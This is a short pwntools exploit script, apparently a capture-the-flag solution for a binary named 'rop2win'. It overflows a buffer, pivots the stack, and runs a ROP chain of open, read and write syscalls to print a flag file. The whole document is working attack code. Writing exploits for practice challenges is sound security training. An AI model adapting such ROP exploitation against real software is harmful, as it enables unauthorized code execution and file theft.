from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

buf = 0x4e0000 - 0x100

pop_rax_ret = 0x0000000000460597
pop_rdi_ret = 0x0000000000401862
pop_rsi_ret = 0x0000000000402878
pop_rdx_ret = 0x000000000040176f
leave_ret = 0x0000000000401e8d
fn_addr = 0x0000000004e0460
rop_addr = 0x0000000004e0360
read_syscall = 0x45f930
read_addr = 0x00000000045f920
write_addr = 0x00000000045f9c0

r = process('./rop2win')

r.sendlineafter(b': ', b'flag\x00')

r.sendlineafter(b': ', flat(
    0, 
    pop_rax_ret, 2,
    pop_rdi_ret, fn_addr, 
    pop_rsi_ret, 0, 
    pop_rdx_ret, 0, 
    read_syscall, 
    pop_rdi_ret, 3, 
    pop_rsi_ret, buf, 
    pop_rdx_ret, 0x30, 
    read_addr, 
    pop_rdi_ret, 1, 
    write_addr
))

r.sendlineafter(b': ', b'a' * 0x20 + flat(rop_addr, leave_ret))

r.interactive()